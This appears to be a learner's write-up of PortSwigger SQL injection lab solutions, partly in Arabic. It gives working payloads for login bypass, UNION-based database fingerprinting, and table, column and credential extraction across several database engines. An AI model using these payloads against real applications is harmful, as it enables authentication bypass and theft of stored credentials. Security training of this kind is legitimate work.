# Sqli 

<details>
  <summary>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</summary>

> ### This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

---
 
* ```url
  /filter?category=Pets
  ```
  * ```url
    /filter?category=Pets' or 1=1 --
    ```

  
</details>







<details>
  <summary>Lab: SQL injection vulnerability allowing login bypass</summary>

> ###  This lab contains a SQL injection vulnerability in the login function.
* > To solve the lab, perform a SQL injection attack that logs in to the application as the ``administrator`` user.

---


```url
csrf=Wf2ku02yY3tefRdA4rFJfn8d1Z48oOeq&username=user&password=pass
```
put username = ``administrator" --`` and write any passowrd it will be ignored anyway and if ``'`` not work try ``"``

```url
csrf=Wf2ku02yY3tefRdA4rFJfn8d1Z48oOeq&username=administrator' --&password=pass
```

  
</details>




<details>
  <summary>Lab: SQL injection attack, querying the database type and version on Oracle</summary>

> ###  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
* > To solve the lab, display the database version string. 

* <details>
     <summary>Hint</summary>

  On Oracle databases, every ``SELECT`` statement must specify a table to select ``FROM``. If your ``UNION SELECT`` attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
  
  There is a built-in table on Oracle called ``dual`` which you can use for this purpose. For example: ``UNION SELECT 'abc' FROM dual``   

  </details>


⚠️⚠️
<details>
  <summary>aobut union injection</summary>

✅ أولاً: "تتأكد إن أنواع البيانات في الأعمدة المتحده (unioned) متوافقة" يعني إيه؟
لما تستخدم ``UNION``، انت بتدمج نتيجتين مع بعض، فلازم الأعمدة اللي في الاستعلام الأول والتاني يكونوا نفس العدد ونفس نوع البيانات.

مثال توضيحي:
لو الاستعلام الأصلي بيرجع:

```sql
id (رقم), name (نص), email (نص)
```

فأنت لازم تكتب: 

```sql
UNION SELECT 1, 'admin', 'admin@example.com'
```
  
</details>
⚠️⚠️

----


```
/filter?category=Gifts
```
first check number of coulmns :

* ```url
  /filter?category=Gifts'union select null FROM dual--
  ```

* ```url
  /filter?category=Gifts'union select null,null FROM dual--
  ```

for check type of coulmns :

* ```url
  /filter?category=Gifts'union select 'a','a' FROM dual--
  ```

now try to know database version :

* **``Oracle :``**
   * ``SELECT banner FROM v$version``
   * ``SELECT version FROM``
   * ``v$instance``

* **``Microsoft :``**
   * ``SELECT @@version`` 

* **``PostgreSQL :``**
   * ``SELECT version()``

* **``MySQL :``**
   * ``SELECT @@version`` 



* ```url
  /filter?category=Gifts'union SELECT banner,NULL FROM v$version--
  ```



  
</details>








<details>
  <summary>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</summary>


> ###  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
> To solve the lab, display the database version string. 


---

```url
'+UNION+SELECT+'abc','def'#
```

* ```
  '+UNION+SELECT+@@version,+NULL#
  ```

  
</details>






<details>
  <summary>Lab: SQL injection attack, listing the database contents on non-Oracle databases</summary>

> ###  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
> ### The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
> To solve the lab, log in as the ``administrator`` user. 


---

```
/filter?category=Gifts' union select NULL,NULL--
```

* <details>
     <summary>⚠️list tables in database⚠️</summary>




  
  ## 🔍 1. Determine the Number of Columns
  
  ```sql
  ' ORDER BY 1--
  ' ORDER BY 2--
  ...
  ' ORDER BY N--
  ```
  
  أوقف عند أول رقم يعطيك خطأ → عدد الأعمدة هو الرقم السابق.
  
  أو باستخدام `UNION SELECT NULL`:
  
  ```sql
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT NULL,NULL,NULL--
  ```
  
  حتى لا يظهر خطأ.
  
  ---
  
  ## 🧠 2. Find Reflectable Columns (أي عمود يظهر على الصفحة)
  
  ```sql
  ' UNION SELECT 'a', NULL--
  ' UNION SELECT NULL, 'a'--
  ```
  
  غيّر مكان `'a'` لترى أين يظهر على الصفحة.
  
  ---
  
  
  
  ## 📋 4. List Tables in the Database
  
  ### 🐬 MySQL
  
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
  ```
  
  ### 🐘 PostgreSQL
  
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
  ```
  
  ### 🪟 MSSQL
  
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables--
  -- OR --
  ' UNION SELECT name, NULL FROM sys.tables--
  ```
  
  ### 🟠 Oracle
  
  ```sql
  ' UNION SELECT table_name, NULL FROM all_tables--
  ```
  
  ---
  
  ## 📑 5. List Columns in a Table
  
  ### 🐬 MySQL
  
  ```sql
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
  
  ### 🐘 PostgreSQL
  
  ```sql
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
  
  ### 🪟 MSSQL
  
  ```sql
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
  
  ---
  
  ## 🧪 Example (MySQL)
  
  - Suppose we know the number of columns is 2, and the first column reflects to the page:
  
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
  ```
  

  
 

     
 </details>


* ```sql
  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
  ```

![image](https://github.com/user-attachments/assets/5dca3238-d8de-478c-9975-a5e940982015)

```
users_qtmswl
```

found tables 

* ```sql
  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qtmswl'--
  ```

found colums:

```
username_xwttla
email
password_ztcwwk
```

* ```sql
  ' UNION+SELECT username_xwttla, password_ztcwwk FROM users_qtmswl--
  ```

![image](https://github.com/user-attachments/assets/c759f3d6-5a1b-4884-885e-9b4ac82fa789)

```
administrator : 3cwvdutv09z9slmekkwm
```
  
</details>






<details>
  <summary>Lab: SQL injection attack, listing the database contents on Oracle</summary>


> ###  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
> ### The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
> To solve the lab, log in as the administrator user. 

---


```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

* ```
  USERS_PURPGR
  ```

```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_PURPGR'--
```

* ```
  PASSWORD_BGNVEO
  USERNAME_WWJQEC
  ```

```
'+UNION+SELECT+USERNAME_WWJQEC,+ PASSWORD_BGNVEO+FROM+USERS_PURPGR--
```

* ```
  administrator
	io37vj2yyj6q36piu2uo
  carlos
	gthqs6kajajbsnpy9xc1
  wiener
	46bp8uni00wnytsv0yob
  ```



  
</details>



































## [Portsqigger cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)



































